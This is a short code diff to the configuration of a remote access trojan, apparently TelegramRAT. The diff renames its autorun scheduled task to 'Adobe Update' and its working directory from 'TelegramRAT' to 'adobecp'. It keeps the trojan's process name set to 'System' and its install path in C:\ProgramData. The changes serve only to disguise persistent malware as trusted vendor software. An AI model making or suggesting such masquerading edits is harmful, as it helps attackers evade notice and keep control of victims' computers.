@@ -23,7 +23,7 @@ AutorunEnabled = True
 # Installation directory
 InstallPath = 'C:\\ProgramData'
 # Task Name in Task Scheduler
-AutorunName = 'OneDrive Update'
+AutorunName = 'Adobe Update'
 # The name of the process in the Task Manager
 ProcessName = 'System'
 
@@ -35,4 +35,4 @@ Message = 'Message'
 
 
 # Directory for saving trojan temporary files
-Directory = 'C:\\ProgramData\\TelegramRAT\\'
+Directory = 'C:\\ProgramData\\adobecp\\'
